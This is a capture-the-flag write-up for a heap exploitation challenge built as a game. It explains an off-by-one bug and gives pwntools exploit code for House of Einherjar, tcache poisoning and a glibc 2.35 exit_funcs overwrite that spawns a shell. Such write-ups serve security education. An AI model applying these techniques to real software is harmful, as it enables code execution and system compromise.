---
title: HACK@AC 2024 - 安心 Impact!
date: 2024-03-23
excerpt: HACK@AC 2024 - Writeup for 安心 Impact! - House of Einherjar with a small twist
category: writeups
tags:
    - pwn
---

Source and relevant files can be [found
here](https://github.com/Coding-Competition-Team/hackac-2024/tree/main/pwn/anshin)

Libc version: 2.35

When writing this challenge, I wanted to create a more subtle heap challenge than the usual "notepad" kind of challenge.
At the same time, I wanted to make it more fun by incorporating a game into it, quite similar to [RPS
2.0](https://github.com/Coding-Competition-Team/HACK-AC-2022/tree/main/Pwn/RPS%202.0). So I decided to create a Genshin
Impact clone just for fun :)

# Analysis

Source code is provided in the repo. Its pretty long so I'll only analyze the important functions here.

Player has a struct to keep track of stats.

```c
struct player {
  char name[30];
  void *inv[30];
  int sizes[30];

  int hp; int ap; int dp; int gold;
  int completed;
};
```

In the main loop, we can do the following actions: Enter Level, Purchase Item, View Inventory or Use Item.

The level isn't so important as we just need sufficient coins to brew items. In the shop, we can brew custom potions and
assign it a name. The potions are stored using `malloc(len)`, where `len` is the length returned by the `read_str`
function. We can rebrew potions which is just editing the data stored in the chunk.

We also have a wishing well that just does `malloc(0)` and stores it in the inventory. This will be important later on.

```c
void shop(struct player *p) {
  char buf[0x1000];
  int len = 0;

  printf(
    "----------------------------------------\n"
    "|%17cShop%17c|\n"
    "----------------------------------------\n"
    "\n",
    ' ', ' '
  );
  printf("You have %d gold\n", p->gold);
  printf(
    "1. Brew potion (20 gold)\n"
    "2. Rebrew potion (10 gold)\n"
    "3. Wishing well (1 gold)\n"
    "4. Exit\n"
    "> "
  );
  int choice = read_int();
  switch (choice) {
    case 1:
      if (p->gold < 20) {
        printf("You don't have enough gold\n");
        break;
      }

      printf("Brew your potion (eg. for a HP pot, enter \"Health potion\"):\n");
      printf("> ");
      len = read_str(buf, 0x1000);
      for (int i = 0; i < 30; i++) {
        if (p->inv[i] == NULL) {
          p->inv[i] = malloc(len);
          p->sizes[i] = len;
          strcpy(p->inv[i], buf);
          p->gold -= 20;
          break;
        }
      }
      break;
    case 2:
      if (p->gold < 10) {
        printf("You don't have enough gold\n");
        break;
      }

      if (!view_inventory(p)) {
        break;
      }

      printf("Select an item to rebrew\n");
      printf("> ");

      int idx = read_int();
      if (idx < 0 || idx >= 30 || p->inv[idx] == NULL) {
        printf("Invalid item\n");
        break;
      }

      printf("Rebrew your potion (eg. for a HP pot, enter \"Health potion\"):\n");
      printf("> ");
      read_str(p->inv[idx], p->sizes[idx]);
      p->gold -= 20;
      break;
    case 3:
      if (p->gold < 1) {
        printf("You don't have enough gold\n");
        break;
      }

      printf("You threw a gold coin into the well\n");

      int i = 0;
      for (i = 0; i < 30; i++) {
        if (p->inv[i] == NULL) {
          p->inv[i] = malloc(0);
          p->sizes[i] = 0;
          p->gold -= 1;
          break;
        }
      }
      sleep(1);
      printf("Nothing happens...");
      printf("(check your inventory at index %d)\n", i);
      break;
    default:
      printf("You left the shop\n");
      break;
  }
}
```

When we use a potion, the data in the potion is read to see what effects it can give according to some preset potions,
and subsequently it is freed. Following best practices, the pointer to it is also set to `NULL`. So secure!

```c
void use_item(struct player *p) {
  if (!view_inventory(p)) {
    return;
  }

  printf("Which item do you want to use? > ");
  int idx = read_int();
  if (idx < 0 || idx >= 30 || p->inv[idx] == NULL) {
    printf("Invalid item\n");
    return;
  }

  if (strstr(p->inv[idx], "Health potion") != NULL) {
    printf("💉 You ate a %s and gained 10 HP!\n", p->inv[idx]);
    p->hp += 10;
  } else if (strstr(p->inv[idx], "Attack potion") != NULL) {
    printf("💪 You ate a %s and gained 5 AP!\n", p->inv[idx]);
    p->ap += 5;
  } else if (strstr(p->inv[idx], "Shield") != NULL) {
    printf("🛡️ You ate a %s and gained 5 DP!\n", p->inv[idx]);
    p->dp += 5;
  } else if (strstr(p->inv[idx], "Poison") != NULL) {
    printf("💀 You ate a %s and lost 10 HP!\n", p->inv[idx]);
    p->hp -= 10;
  } else if (strstr(p->inv[idx], "Sleeping pill") != NULL) {
    printf("💤 You ate a %s and fell asleep\n", p->inv[idx]);
    for (int i = 0; i < 3; i++) {
      printf("z");
      sleep(1);
    }
    printf("\n");
  } else if (strstr(p->inv[idx], "NeuroSynthoQuantaXenithron 5000") != NULL) {
    printf("🏃 You ate a %s and feel like you can run faster!\n", p->inv[idx]);
    printf("(might be a placebo tho)\n");
  } else if (strstr(p->inv[idx], "Big mac") != NULL) {
    printf("🍔 You ate a %s and gained 0.5kg!\n", p->inv[idx]);
  } else {
    printf("🤢 You ate a %s and had a tummy ache\n", p->inv[idx]);
  }

  free(p->inv[idx]);
  p->inv[idx] = NULL;
  p->sizes[idx] = 0;
  return;
}
```

Lastly, in the inventory, we can simply see all the currently bought potions.

```c
int view_inventory(struct player *p) {
  printf(
    "----------------------------------------\n"
    "|%16cInventory%16c|\n"
    "----------------------------------------\n",
    ' ', ' '
  );
  int count = 0;
  for (int i = 0; i < 30; i++) {
    if (p->inv[i] != NULL) {
      count++;
      printf("%d: %s\n", i, p->inv[i]);
    }
  }
  if (count == 0) {
    printf("Your inventory is empty\n");
  }
  printf("\n");
  return count;
}
```

The program uses the `read_str` function to read input.

```c
int read_str(char *buf, int len) {
  int i;
  for (i = 0; i <= len; i++) {
    if (!read(0, buf + i, 1)) {
      return i;
    }
    if (buf[i] == '\n') {
      buf[i] = '\0';
      return i;
    }
  }
  return i;
}
```

# Vulnerability

We see in the above `read_str` function an off-by-one vulnerability! The `len` field is used to specify how many
characters to read. However, the loop actually reads `len + 1` characters, which makes it vulnerable.

This can be exploited in the potion rebrewing functionality, since length is determined by the length of user input
earlier during brewing. Let's say we input a potion of name length 0x18. The chunk would be

```
0x00: 0x0000000000000000 0x0000000000000021
0x10: 0x6161616161616161 0x6161616161616161
0x20: 0x6161616161616161 0x0000000000080001 (forest)
```

When we rebrew, we can read 0x19 characters in.

```
0x00: 0x0000000000000000 0x0000000000000021
0x10: 0x6262626262626262 0x6262626262626262
0x20: 0x6262626262626262 0x0000000000080061 (forest, overwritten!)
```

Thus, we have control over the `size` field of the adjacent chunk. From here, we can use the well-known House of
Einherjar to proceed.

# House of Einherjar

In the earlier example, the adjacent chunk was forest. What if it were another regular chunk?


Before:
```
0x00: 0x0000000000000000 0x0000000000000021
0x10: 0x6161616161616161 0x6161616161616161
0x20: 0x6161616161616161 0x0000000000000101 (chunk)
...
```

After:
```
0x00: 0x0000000000000000 0x0000000000000021
0x10: 0x6262626262626262 0x6262626262626262
0x20: 0x6262626262626262 0x0000000000000100 (chunk overwritten with a null byte)
```

As we know, the `size` field contains some metadata in the smallest nibble. We see what flags it corresponds to in libc
source code:

```c
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
```

So a change of size from 0x101 to 0x100 will unset the `PREV_INUSE` flag. This flag is referenced when freeing an
unsorted-sized chunk.

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Take a chunk off a bin list.  */
static void
unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");

  mchunkptr fd = p->fd;
  mchunkptr bk = p->bk;

  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

  fd->bk = bk;
  bk->fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
    {
      if (p->fd_nextsize->bk_nextsize != p
	  || p->bk_nextsize->fd_nextsize != p)
	malloc_printerr ("corrupted double-linked list (not small)");

      if (fd->fd_nextsize == NULL)
	{
	  if (p->fd_nextsize == p)
	    fd->fd_nextsize = fd->bk_nextsize = fd;
	  else
	    {
	      fd->fd_nextsize = p->fd_nextsize;
	      fd->bk_nextsize = p->bk_nextsize;
	      p->fd_nextsize->bk_nextsize = fd;
	      p->bk_nextsize->fd_nextsize = fd;
	    }
	}
      else
	{
	  p->fd_nextsize->bk_nextsize = p->bk_nextsize;
	  p->bk_nextsize->fd_nextsize = p->fd_nextsize;
	}
    }
}

...
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
...
```

So we see it consolidates the chunk with the previous (supposedly freed) chunk, by reading the `prev_size` field, which
according to freed chunk structure, is the address just before the size field.

```
0x00: 0x0000000000000000 0x0000000000000021
0x10: 0x6262626262626262 0x6262626262626262
0x20: 0x6262626262626262 0x0000000000000100 (chunk overwritten with a null byte)
      (aka here)
```

So, with control over `prev_size` and `prev_inuse`, we can trick libc into consolidating the chunk that's about to be
freed with a region we control in the initial chunk. However, there are 2 checks we need to bypass:

1. "corrupted size vs. prev_size while consolidating": the `prev_size` field of the escond chunk must match the `size`
   of the first chunk.
2. "corrupted double-linked list": `p->fd->bk == p` and `p->bk->fd == p`.

`prev_size` is also used as the negative offset from second chunk to first chunk. So, where we place our fake chunk
relative to second chunk will become the `size` field of fake chunk, as well as `prev_size` field of second chunk.

Here, `p` refers not to second chunk but to fake chunk. So the fake chunk must have the correct `fd` and `bk` pointers
that fulfill the condition. One easy way to do this with a heap leak is to make it point to itself.

Our fake chunk and second chunk should look like this:

```
0x00: 0x0000000000000000 0x0000000000000061
0x10: 0x0000000000000000 0x0000000000000051 (size)
0x20: 0x0000000000000020 0x0000000000000020 (fd and bk)
0x30: 0x0000000000000000 0x0000000000000000
0x40: 0x0000000000000000 0x0000000000000000
0x50: 0x0000000000000000 0x0000000000000000
0x60: 0x0000000000000050 0x0000000000000100 
```

We can see that `0x60 - 0x50` points to `0x10`, the start of fake chunk.

After freeing, we've now got consolidation, then what happens?

```
0x00: 0x0000000000000000 0x0000000000000061
0x10: 0x0000000000000000 0x0000000000000151 (in unsorted bin)
0x20: 0x0000000000000020 0x0000000000000020
0x30: 0x0000000000000000 0x0000000000000000
0x40: 0x0000000000000000 0x0000000000000000
0x50: 0x0000000000000000 0x0000000000000000
0x60: 0x0000000000000000 0x0000000000000000 
```

Our first chunk now overlaps the fake chunk. Using the rebrew function, we can now view and edit `fd` and `bk` of the
fake unsorted chunk!

Note the following behaviour of unsorted chunks:
```c
/*
   Unsorted chunks

    All remainders from chunk splits, as well as all returned chunks,
    are first placed in the "unsorted" bin. They are then placed
    in regular bins after malloc gives them ONE chance to be used before
    binning. So, basically, the unsorted_chunks list acts as a queue,
    with chunks being placed on it in free (and malloc_consolidate),
    and taken off (to be either used or placed in bins) in malloc.

    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it
    does not have to be taken into account in size comparisons.
*/

/* Conveniently, the unsorted bin can be used as dummy top on first call */
#define initial_top(M)              (unsorted_chunks (M))
```

So, the unsorted chunk is like a temporary "forest" - it wants to be serviced in place of forest. This means some
`malloc()` operations on top also happen to unsorted chunks, allowing it to even do stuff like splitting and servicing
smaller chunks, while retaining its unsortedness without going into smallbin. This chunk is known as the last remainder
chunk.

Also, we can leak libc through a few tricks. The fake chunk contains `main_arena` which we can use to leak libc.
However, since we're printing using `printf` and `%s`, we can't view the fake chunk directly from `view_inventory`
because of the null bytes. However, if we can get a chunk that aligns with the fake chunk without overwriting the `fd`
ptr, we can then leak libc.

In the wishing well, the behaviour of `malloc(0)` is just to allocate the smallest chunk available, `0x21`. Therefore,
this allows us to allocate a chunk at the top of our fake chunk without overwriting anything, hence allowing us to leak
libc.

```
0x00: 0x0000000000000000 0x0000000000000061
0x10: 0x0000000000000000 0x0000000000000021 
0x20: 0x0000000000000020 0x0000000000000020 <- malloc(0) returns a pointer to 0x20
0x30: 0x0000000000000000 0x0000000000000131 (in unsorted bin)
0x40: 0x0000000000000020 0x0000000000000040
0x50: 0x0000000000000000 0x0000000000000000
0x60: 0x0000000000000000 0x0000000000000000 
```

From here, exploitation is simple. On 2.35, without `__free_hook`, we can either
attack `exit_funcs` or perform House of Apple . I chose to do `exit_funcs` here.

# Exploitation

First, we need heap leak for the above. This can be gotten from (again!) the off-by-one in `read_str`, now on
`username`, because in the player struct, `name` is right before the `inv[]` array. So by making sure `name` has no null
byte, we can leak the pointer to `inv[0]`.

```py
p.sendline(b"a"*32)

# clear lvl 1 to earn enough gold for heap exploit
level1(p)

# leak heap base
p.clean()
purchase(p, b"Poison") # get heap pointer (which is next to username)
p.recvuntil(b"a"*32)
leak = u64(p.recvuntil(b"'s", drop=True).ljust(8, b"\x00"))
heap_base = leak - 0x2a0
print(hex(heap_base))
use(p, 0)
```

Before doing House of Einherjar, we need to first block off tcache for our second chunk, because tcache chunks aren't
"freed" in the usual sense (it bypasses a lot of the logic in `free()`), and so consolidation won't occur. We can also
use these chunks to "poison" our hp to 0, so we can exit smoothly later when we enter the next level.

```py
# setup the heap
for i in range(7):
    # fill up tcache so that the consolidated chunk doesn't go to tcache
    # but triggers consolidate instead
    purchase(p, b"Poison" + b"a"*(0xf0 - 6)) # use poison to get hp to 0
```

```c
  if (p->hp <= 0) {
    printf("😭\n");
    printf("You died...\n");
    exit(0);
```

Now, we can setup our target chunks and free the previous tcache chunks. Chunk 7 is just any big chunk so we can play
more with target size later. Chunk 8 is the second chunk to overwrite, and chunk 9 prevents consolidation with the
forest so our chunk is placed in unsorted bin instead of becoming new forest (forward consolidation is ok).

```py
purchase(p, b"a"*0x1f8) # 7 - our controlled chunk
purchase(p, b"a"*0xf0) # 8 - consolidated chunk
purchase(p, b"a"*0x20) # 9 - separate from wilderness
for i in range(7):
    use(p, i)
```

```c
if (nextchunk != av->top) {
  /* get and clear inuse bit */
  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

  /* consolidate forward */
  if (!nextinuse) {
    unlink_chunk (av, nextchunk);
    size += nextsize;
  } else clear_inuse_bit_at_offset(nextchunk, 0);
  // place chunk in unsorted
  ...
} else {
  size += nextsize;
  set_head(p, size | PREV_INUSE);
  av->top = p;
  check_chunk(av, p);
}
```

Now, we perform House of Einherjar.

```py
# the off-by-one will change chunk_8 PREV_INUSE bit to 0 cos of the appended null byte
payload = flat(
    0x0, 0x1f0, # 0x1f0 must match the size to pass corrupted size vs. prev_size
    heap_base + 0x9c0, heap_base + 0x9c0, # p = heap_base + 0x9c0, fd->bk == p, bk->fd == p to pass corrupted double-linked list
    b"a"*0x1d0,
    0x1f0, # this size (prev_size) must be such that chunk_8 - 0x1f0 points to the fd and bk ptrs
)
edit(p, 7, payload)

# trigger consolidate
use(p, 8)
```

Here we want to use wishing well to leak libc. We need to do it twice, because the very first chunk for heap leak was
also size 0x21 (we could have avoided this if we made the first chunk part of the tcache setup step)

```py
wish(p)

# leak libc base (chunk_8 is in unsorted bin)
wish(p)

leak = u64(view(p, 1).ljust(8, b"\x00"))
libc_base = leak - 0x219fc0
print(hex(libc_base))
libc.address = libc_base
```
We can now exploit last remainder chunk mechanism to do 2 small writes, which is necessary for `exit_funcs` route.
(House of Apple only needs 1 large write, it's a viable alternative). These are the targets we're interested in:
```py
def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# target0: ptr_guard = 0
target0 = encrypt(heap_base + 0xa50, libc_base - 0x2890)
write0 = p64(0)

# target1: exit_funcs overwrite
target1 = encrypt(heap_base + 0xa70, libc_base + 0x21af00)
write1 = flat(
    0, 1,
    4, rol(libc.sym.system, 0x11, 64),
    next(libc.search(b"/bin/sh\x00"))
)
```

Here, we don't mind using tcache chunks anymore. In fact, it's even easier to exploit than fastbin precisely because it
skips so much logic. However, make sure to alloc at least 2 chunks, if not the `fd` we overwrite is just null and won't
be placed at target address.

```py
# extra 1 chunk per tcache bin so that we can overwrite an existing chunk ptr
# if we only used 1 chunk per bin, tcache will see that number of chunks freed < number of chunks we want
# and not allocate us target0 and target1 (it will be taken from new addresses instead)
purchase(p, b"a"*0x10) # 2
purchase(p, b"a"*0x30) # 3
purchase(p, b"b"*0x10) # 4
purchase(p, b"c"*0x30) # 5
use(p, 2)
use(p, 3)
use(p, 4)
use(p, 5)

# use overlapping chunks to control fd ptr of poisoned chunks
payload = flat(
    0, 0x21,
    0, 0,
    0, 0x21,
    0, 0,
    0, 0x41,
    0, 0,
    0, 0,
    0, 0,
    0, 0x21,
    target0, 0,
    0, 0x41,
    target1, 0,
)
edit(p, 7, payload)
```

Lastly, we free the poisoned tcache chunks and get our write primitives! Upon exit, we will get our shell.

```py
purchase(p, b"b"*0x10)
purchase(p, b"c"*0x30)

purchase(p, b"\x00"*0x10) # 4
purchase(p, b"\x00"*0x30) # 5

edit(p, 4, write0)
edit(p, 5, write1)

# trigger exit
p.sendline(b"1")

p.interactive()
```
![pwned](@images/2024/hackac-2024-anshin/flag.png)
